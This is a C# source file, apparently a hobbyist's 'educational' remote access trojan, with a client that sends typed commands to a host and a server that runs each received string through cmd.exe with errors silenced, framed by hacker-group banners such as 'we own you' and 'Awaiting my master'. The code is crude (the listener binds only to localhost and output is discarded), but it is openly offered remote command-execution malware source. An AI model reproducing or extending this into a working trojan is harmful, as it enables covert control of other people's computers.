

// Hey, this code is purely for those who want to understand the
// idea of how a R.A.T. structures itself code wise.


// Author: Dashie
// Version: 1.0


using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;


namespace Reverse_Shell
{
    static class Program
    {
        public static void Write(string str, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(str);
        }

        public static string Input(String str, ConsoleColor color1, ConsoleColor color2)
        {
            Console.ForegroundColor = color1;
            Console.Write(str);
            Console.ForegroundColor = color2;
            
            return Console.ReadLine();
        }

        static void Main()
        {
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();

            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
            Write("> We are Dash Society, we own you <3", ConsoleColor.DarkCyan);
            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
            Write("> Use one of the following commands:", ConsoleColor.DarkCyan);
            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
            Write("> control   -=-   Control a server running this server.", ConsoleColor.DarkCyan);
            Write("> server    -=-   Start our server.", ConsoleColor.DarkCyan);
            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n", ConsoleColor.Gray);

            while (true)
            {
                string option = Input("$(DashSociety/Option)> ", ConsoleColor.Blue, ConsoleColor.White).ToLower();

                Console.ForegroundColor = ConsoleColor.DarkGreen;

                if (option.Equals("control"))
                    Client.control();

                else if (option.Equals("server"))
                    Server.start();
            };
        }
    };


    class Client
    {
        public static void control()
        {
            try
            {
                string host = Program.Input("$(DashSociety/Host)> ", ConsoleColor.Blue, ConsoleColor.White);
                string s_port = Program.Input("$(DashSociety/Port)> ", ConsoleColor.Blue, ConsoleColor.White);

                if(int.Parse(s_port) < 0)
                {
                    Program.Write("[!] Invalid integral value ;c", ConsoleColor.DarkYellow);
                    return;
                };

                int.TryParse(s_port, out int port);

                Program.Write($"[-] Connecting to {host}:{port} ....", ConsoleColor.DarkGray);

                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.Connect(host, port);

                if (!client.Connected)
                {
                    Program.Write("[!] A connection could not be estabilished with the host!", ConsoleColor.DarkYellow);
                    return;
                };

                Program.Write($"[+] You are now connected to {host}:{port} !", ConsoleColor.Gray);
                Program.Write("[-] Starting the interactive Dash Shell ....", ConsoleColor.DarkGray);
                Program.Write("[+] Dash Shell session has been summoned!", ConsoleColor.Gray);
                Program.Write("[?] Type \'!help\' at any time for a list of commands.", ConsoleColor.Gray);
                Program.Write("[?] Type \'!bye\' at any time to exit to the menu.", ConsoleColor.Gray);

                while (true)
                {
                    string str = Program.Input($"$(Dash Society/{host}:{port})> ", ConsoleColor.Blue, ConsoleColor.White);
                    string lwr = str.ToLower();

                    if(lwr.Equals("!bye"))
                    {
                        return;
                    }

                    else if(lwr.Equals("!help"))
                    {

                    };

                    byte[] command = Encoding.ASCII.GetBytes(str + "\n");

                    client.Send(command);

                    Console.WriteLine("[+] Command has been executed!", ConsoleColor.Gray);
                };
            }

            catch
            { 
                Console.WriteLine("[!] An error has occurred, please reconnect.", ConsoleColor.DarkYellow); 
            };
        }
    };
    

    // To-Do: Revamp server code:
    class Server
    {
        public static void start()
        {
            Console.WriteLine("[-] Starting local server ....");

            int rand_port = new Random().Next(10000, 65535);

            TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"), rand_port);
            listener.Start();

            Console.WriteLine($"[+] Server is now running on 127.0.0.1:{rand_port}");

            while (true)
            {
                try
                {
                    Console.WriteLine("[-] Awaiting my master ....");

                    Socket sock = listener.AcceptSocket();

                    byte[] cache = new byte[100];

                    sock.Receive(cache);

                    Console.WriteLine("[+] Master has sent me a command.");
                    Console.WriteLine("[-] Executing it ....");

                    string command = "/C " + Encoding.ASCII.GetString(cache);

                    Process shell = new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = "C:\\Windows\\System32\\cmd.exe",
                            Arguments = command,
                        },
                    };

                    shell.Start();

                    sock.Send(Encoding.ASCII.GetBytes("OK!"));
                    sock.Close();

                    Console.WriteLine("[+] I have done what the master had told me to.");
                }

                catch
                {
                    // Silencing Potential Errors
                };
            };
        }
    };
};
